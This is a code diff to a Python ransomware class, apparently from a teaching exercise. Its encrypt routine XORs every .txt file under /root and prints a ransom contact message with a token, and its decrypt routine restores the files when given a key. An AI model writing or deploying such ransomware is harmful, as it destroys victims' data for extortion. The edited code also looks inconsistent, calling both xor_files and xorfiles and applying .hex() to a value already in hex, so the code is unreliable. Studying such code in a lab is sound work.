@@ -35,52 +35,40 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
+        
         # return all files matching the filter
+        # example: get_files("*.txt") will return all txt files
         return list(Path("/root").glob(filter))
+
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        # get all the txt files
-        files = self.get_files("*.txt")
-        # create a secret manager
-        secret_manager = SecretManager(CNC_ADDRESS)
-        # call the setup
-        secret_manager.setup()
-        # encrypt the files
-        for file in files:
-            with open(file, "rb") as f:
-                data = f.read()
-            encrypted_data = secret_manager.encrypt(data)
-            with open(file, "wb") as f:
-                f.write(encrypted_data)
-        # print the message
-        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
-        
+        FILES = self.get_files("*.txt")
+        secret_manager = SecretManager()# create secret manager
+        secret_manager.setup()# setup secret manager
+        secret_manager.xor_files(FILES)# xor files
+
+        TOKEN = secret_manager.get_hex_token()# get token
+        MESSAGE_CONTACT=ENCRYPT_MESSAGE.format(TOKEN.hex())# create message
+        print(MESSAGE_CONTACT)# print message
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        # try exept to catch the exception if the token is not valid
-        try:
-            # ask the user for the token
-            token = input("Token: ")
-            # call set_key
-            secret_manager = SecretManager(CNC_ADDRESS)
-            secret_manager.set_key(token)
-            # call the xorfile function
-            files = self.get_files("*.txt")
-            for file in files:
-                secret_manager.xorfile(file)
-            #call the clean function
-            secret_manager.clean()
-            # print the message
+        # main function for decrypting 
+        #ask the user the base64 key
+        key=base64.b64decode(input("Enter key: "))#decode the key
+        FILES=self.get_files("*.txt")#get all txt files
+        secret_manager=SecretManager()
+        if(secret_manager.check_key(key)):#check if the key is correct
+            secret_manager.set_key(key)#set the key
+            secret_manager.xorfiles(FILES,key)#xor the files
             print("Your files have been decrypted")
-            # leave the program
-            sys.exit(0)
-        except Exception as e:
-            # print the error message
-            print("Invalid token")
-            # go back to the main function
-            self.decrypt()
+        else:
+            print("Wrong key")
+            sys.exit(1)
+
+      
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
